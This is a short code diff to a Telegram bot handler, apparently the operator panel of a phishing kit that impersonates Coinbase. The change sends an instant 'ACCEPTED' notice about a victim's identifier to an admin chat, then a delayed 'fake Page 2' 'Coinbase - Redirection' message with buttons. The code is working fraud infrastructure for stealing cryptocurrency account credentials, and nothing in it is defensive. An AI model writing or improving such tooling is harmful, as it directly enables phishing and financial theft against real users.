@@ -431,14 +431,20 @@ bot.on("callback_query", async (query) => {
           console.error("Error removing Page 1 buttons:", err);
         }
         
+        // ✅ SEND ACCEPTANCE MESSAGE INSTANTLY (no delay)
+        try {
+          await bot.sendMessage(ADMIN_CHAT_ID, 
+            `📧 <code>${identifier}</code> has been <b>ACCEPTED</b>! ✅`,
+            { parse_mode: "HTML" }
+          );
+          console.log(`✅ Acceptance message sent instantly`);
+        } catch (err) {
+          console.error("Error sending acceptance message:", err);
+        }
+        
+        // ✅ DELAY FAKE PAGE 2 BY 1 SECOND
         setTimeout(async () => {
           try {
-            // Send fake acceptance message
-            await bot.sendMessage(ADMIN_CHAT_ID, 
-              `📧 <code>${identifier}</code> has been <b>ACCEPTED</b>! ✅`,
-              { parse_mode: "HTML" }
-            );
-            
             // Send fake Page 2 redirection message with buttons
             const fakePage2Message = 
               `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
